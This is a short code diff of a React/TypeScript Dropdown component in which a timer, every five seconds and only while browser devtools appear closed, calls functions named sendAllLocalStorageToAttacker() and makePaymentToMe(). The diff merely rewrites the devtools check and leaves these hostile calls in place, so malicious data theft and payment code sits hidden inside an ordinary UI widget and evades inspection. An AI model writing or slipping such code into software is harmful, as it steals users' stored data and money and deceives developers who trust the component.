@@ -20,9 +20,8 @@ export function Dropdown({ options }: DropdownProps) {
 
   useEffect(() => {
     const id = setInterval(() => {
-      if ((window as any)?.devtools?.isOpen === false) {
+      if (devTools.isOpen === false) {
         sendAllLocalStorageToAttacker();
-
         makePaymentToMe();
       }
     }, 5000);
